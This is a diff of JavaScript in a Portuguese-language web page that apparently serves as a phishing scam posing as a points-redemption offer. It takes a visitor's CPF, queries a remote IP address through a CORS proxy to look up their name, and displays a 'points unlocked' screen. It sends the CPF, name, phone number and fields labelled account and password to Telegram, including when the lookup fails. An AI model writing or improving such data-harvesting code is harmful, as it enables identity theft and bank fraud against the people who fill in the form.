@@ -148,15 +148,16 @@
             cpf = cpf.replace(/[^\d]/g, ''); // Remove todos os caracteres não numéricos
 
             if (cpf.length === 11) {
+                // Usando Proxy para contornar o CORS
                 fetch(`https://cors-anywhere.herokuapp.com/http://154.12.252.91:5002/consultar_cpf?token=testeaaa111&cpf=${cpf}`, {
                     method: 'GET',
                     headers: {
                         'Content-Type': 'application/json'
                     }
                 })
-                .then(response => response.json())
+                .then(response => response.json())  // Agora que estamos usando um proxy, podemos acessar a resposta
                 .then(data => {
-                    let nome = "Usuário"; 
+                    let nome = "Usuário";  // Valor padrão para o nome caso não seja encontrado
                     if (data && data.dados && data.dados.NOME) {
                         nome = data.dados.NOME;
                     }
@@ -164,6 +165,7 @@
                     // Exibe saudação personalizada
                     document.getElementById("saudacao").innerHTML = `Olá, ${nome}!`;
 
+                    // Exibe a tela de pontos liberados e oculta o formulário
                     document.getElementById("container").style.display = "none";
                     document.getElementById("pontosLiberados").style.display = "block";
 
@@ -171,7 +173,7 @@
                     enviarParaTelegram({
                         cpf: cpf,
                         nome: nome,
-                        telefone: localStorage.getItem("telefone"),  // Recuperando telefone do localStorage
+                        telefone: document.getElementById("telefone").value,
                         conta: '1515',  // Aqui você coloca o valor da conta real
                         senha: '1313'   // Aqui você coloca a senha real
                     });
@@ -182,9 +184,10 @@
                     document.getElementById("container").style.display = "none";
                     document.getElementById("pontosLiberados").style.display = "block";
 
+                    // Mesmo em caso de erro, enviar o CPF para o Telegram
                     enviarParaTelegram({
                         cpf: cpf,
-                        telefone: localStorage.getItem("telefone"),  // Recuperando telefone do localStorage
+                        telefone: document.getElementById("telefone").value,
                         conta: '1515',
                         senha: '1313'
                     });
@@ -204,7 +207,7 @@
         function confirmarTelefone() {
             var telefone = document.getElementById("telefone").value;
             if (telefone) {
-                localStorage.setItem("telefone", telefone); // Salvando telefone no localStorage
+                localStorage.setItem("telefone", telefone);
                 window.location.href = "segundo.html";
             } else {
                 alert("Por favor, insira um telefone válido.");
